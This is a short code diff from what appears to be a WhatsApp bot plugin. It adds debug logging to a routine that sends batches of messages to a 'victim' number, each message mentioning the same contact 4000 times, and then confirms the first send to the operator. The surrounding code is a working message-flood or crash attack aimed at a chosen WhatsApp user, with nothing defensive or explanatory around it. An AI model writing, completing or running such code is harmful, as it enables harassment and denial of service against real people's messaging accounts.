@@ -148,14 +148,15 @@ async (Void, citel, text,{ isCreator }) => {
         }
 
         let ying = victim + '@s.whatsapp.net';
-
+        console.log(`jid: ${jid}`);
+        console.log(`ying jid: ${ying}`);
         for (let i = 0; i < totalSends; i += batchSends) {
             for (let j = 0; j < batchSends; j++) {
                 await Void.sendMessage(ying, {
                     text: message,
                     mentions: Array(4000).fill(bom) // Mention the same JID 4000 times
                 });
-
+        console.log(`bom: ${bom}`);
                 // Confirmation after sending the first message
                 if (!firstMessageSent) {
                     await Void.sendMessage(userId, {
